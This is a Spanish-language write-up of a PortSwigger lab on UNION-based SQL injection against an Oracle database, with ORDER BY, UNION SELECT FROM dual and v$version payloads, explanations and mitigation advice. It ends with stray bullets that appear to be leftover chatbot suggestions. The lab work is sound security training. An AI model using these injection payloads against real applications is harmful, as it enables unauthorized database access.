@@ -1,0 +1,321 @@
+# Lab: SQL Injection Attack – Querying the Database Type and Version (Oracle)
+
+Laboratorio de **PortSwigger Web Security Academy** en el que se explota una vulnerabilidad de **SQL Injection** en el filtro de productos por categoría.
+
+El objetivo del laboratorio es **identificar el tipo y la versión del sistema de base de datos** utilizando una técnica de **UNION-based SQL Injection**.
+
+---
+
+# 🎯 Objetivo del laboratorio
+
+La aplicación contiene una vulnerabilidad de **SQL Injection** en el parámetro:
+
+```
+category
+```
+
+Este parámetro es utilizado para filtrar productos en la aplicación web.
+
+El objetivo consiste en:
+
+* identificar el número de columnas de la consulta
+* utilizar `UNION SELECT`
+* recuperar la **versión de la base de datos Oracle**
+
+---
+
+# 🌐 Punto de entrada
+
+La aplicación permite filtrar productos mediante una URL similar a:
+
+```
+/filter?category=Gifts
+```
+
+La consulta SQL que la aplicación probablemente ejecuta es similar a:
+
+```sql
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1;
+```
+
+Debido a que el valor del parámetro se inserta directamente dentro de la consulta, es posible modificar la lógica SQL.
+
+---
+
+# 🔎 Identificación del número de columnas (`ORDER BY`)
+
+El primer paso consiste en determinar **cuántas columnas devuelve la consulta original**.
+
+Para ello se utiliza la cláusula `ORDER BY`.
+
+### Payload utilizado
+
+```
+Gifts' ORDER BY 2-- -
+```
+![Resultado del laboratorio](Imagenes/orderdos.png)
+---
+
+Sabevemos que existen dos ya que si agregamos mas nos arroja un error:
+
+![Resultado del laboratorio](Imagenes/errorby.png)
+
+## Explicación del payload
+
+### Cierre de la cadena
+
+El carácter:
+
+```sql
+'
+```
+
+cierra la cadena de texto utilizada en la consulta original.
+
+---
+
+### Uso de `ORDER BY`
+
+La cláusula:
+
+```sql
+ORDER BY 2
+```
+
+ordena los resultados utilizando la **segunda columna**.
+
+En pruebas de seguridad se utiliza para determinar **el número de columnas**.
+
+Si el número indicado es mayor que el número de columnas reales, el servidor generará un error.
+
+Ejemplo de pruebas:
+
+```
+ORDER BY 1
+ORDER BY 2
+ORDER BY 3
+```
+
+Cuando aparece un error se puede deducir el número real de columnas.
+
+En este laboratorio se identificó que **la consulta tiene 2 columnas**.
+
+---
+
+### Comentario SQL
+
+La secuencia:
+
+```sql
+-- -
+```
+
+convierte el resto de la consulta en un comentario.
+
+---
+
+# 💥 SQL Injection con `UNION SELECT`
+
+Una vez identificado el número de columnas, se utiliza **UNION SELECT** para inyectar datos controlados.
+
+### Payload utilizado
+
+```sql
+Gifts' UNION SELECT '1','2' FROM dual-- -
+```
+![Resultado del laboratorio](Imagenes/orderdos.png)
+---
+
+# Explicación del payload
+
+## Uso de `UNION`
+
+La cláusula:
+
+```sql
+UNION SELECT
+```
+
+permite combinar los resultados de la consulta original con otra consulta.
+
+Para que funcione correctamente:
+
+* ambas consultas deben devolver **el mismo número de columnas**
+* los **tipos de datos deben ser compatibles**
+
+---
+
+## Valores de prueba
+
+```sql
+'1','2'
+```
+
+Se utilizan para comprobar qué columnas se reflejan en la respuesta de la aplicación.
+
+---
+
+## Uso de `FROM dual`
+
+En **Oracle**, la tabla especial:
+
+```sql
+dual
+```
+
+permite realizar consultas sin necesidad de una tabla real.
+
+Ejemplo:
+
+```sql
+SELECT 'test' FROM dual;
+```
+
+---
+
+# Consulta resultante
+
+La consulta SQL puede interpretarse de la siguiente forma:
+
+```sql
+SELECT name, description
+FROM products
+WHERE category = 'Gifts'
+UNION SELECT '1','2' FROM dual-- -';
+```
+
+---
+
+# 📊 Resultado observado
+
+Los valores **1** y **2** aparecen en la respuesta de la aplicación.
+
+Esto confirma que:
+
+* la inyección SQL es posible
+* la consulta contiene **2 columnas**
+* los resultados del `UNION` se muestran en la página
+
+---
+
+# 🧠 Identificación del tipo de base de datos
+
+El uso de:
+
+```sql
+FROM dual
+```
+
+es característico de **Oracle Database**, lo que indica que el sistema de base de datos utilizado por la aplicación es **Oracle**.
+
+---
+
+# 🧩 Obtención de la versión de la base de datos
+
+Una vez confirmada la base de datos, se consulta la vista del sistema `v$version`.
+
+### Payload utilizado
+
+```sql
+Gifts' UNION SELECT '1', banner FROM v$version-- -
+```
+
+![Resultado del laboratorio](Imagenes/orderdos.png)
+
+---
+
+# Explicación del payload
+
+### Consulta a `v$version`
+
+En **Oracle**, la vista:
+
+```sql
+v$version
+```
+
+contiene información sobre:
+
+* versión del motor de base de datos
+* versión de PL/SQL
+* componentes instalados
+* información del kernel
+
+---
+
+### Campo `banner`
+
+La columna:
+
+```sql
+banner
+```
+
+contiene las cadenas que describen las versiones del sistema.
+
+---
+
+# Consulta SQL final
+
+```sql
+SELECT name, description
+FROM products
+WHERE category = 'Gifts'
+UNION SELECT '1', banner FROM v$version-- -';
+```
+
+---
+
+# 📊 Resultado
+
+La aplicación muestra múltiples cadenas con información sobre la base de datos, incluyendo:
+
+* versión del motor de base de datos
+* versión de PL/SQL
+* componentes instalados
+* información del sistema Oracle
+
+Esto confirma que el atacante puede **extraer información interna del sistema de base de datos**.
+
+---
+
+# 🔐 Impacto de la vulnerabilidad
+
+Una vulnerabilidad de **SQL Injection** puede permitir a un atacante:
+
+* acceder a información sensible
+* enumerar tablas y columnas
+* extraer datos de usuarios
+* comprometer completamente la base de datos
+
+En escenarios reales esto puede resultar en **exposición total de la información almacenada**.
+
+---
+
+# 🛡️ Mitigación
+
+Para prevenir este tipo de vulnerabilidades se recomienda:
+
+* utilizar **consultas parametrizadas**
+* implementar **Prepared Statements**
+* validar y sanitizar las entradas del usuario
+* emplear **ORM seguros**
+* aplicar principios de **mínimo privilegio en la base de datos**
+
+---
+
+# ✅ Conclusión
+
+Este laboratorio demuestra cómo una vulnerabilidad de **SQL Injection en un parámetro de filtrado** puede ser explotada para obtener información crítica del sistema de base de datos.
+
+Mediante técnicas como:
+
+* `ORDER BY`
+* `UNION SELECT`
+* consultas a vistas del sistema (`v$version`)
+
+es posible identificar el tipo de base de datos y recuperar su versión.
+
+* **una plantilla universal para todos los labs de SQL Injection de PortSwigger** (te ahorra muchísimo tiempo documentando)
+* **cómo organizar tu repo para que parezca de pentester profesional**
+* **payloads para TODOS los labs de SQLi de PortSwigger (más de 30)**.
